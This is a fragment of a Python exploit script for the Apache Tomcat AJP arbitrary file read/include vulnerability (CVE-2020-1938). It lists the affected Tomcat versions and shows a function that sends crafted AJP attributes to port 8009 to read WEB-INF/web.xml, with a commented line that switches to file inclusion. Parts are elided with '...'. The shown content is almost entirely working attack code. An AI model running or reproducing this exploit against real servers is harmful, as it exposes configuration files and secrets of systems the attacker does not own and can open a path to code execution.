...
# Author     : yunkong
# FileName   : cve_2020_1938_exp.py
# Description:
#
# Exploit Title: Aapache Tomcat AJP Arbitrary File Read / Include Vulnerability（CVE-2020-1938）
# Version: Apache Tomcat 6; Apache Tomcat 7 < 7.0.100; Apache Tomcat 8 < 8.5.51; Apache Tomcat 9 < 9.0.31
# CVE: CVE-2020-1938
...
def vuln_exploit_start(target, port=8009, file_path='WEB-INF/web.xml'):
    t = Tomcat(target, port)
    # _, data = t.perform_request('/asdf.jsp', attributes=[   # 文件包含使用这行代码
    _, data = t.perform_request('/asdf', attributes=[   # 文件读取使用这行代码
        {'name': 'req_attribute', 'value': ['javax.servlet.include.request_uri', '/']},
...
# vuln_exploit_start("192.168.12.130")
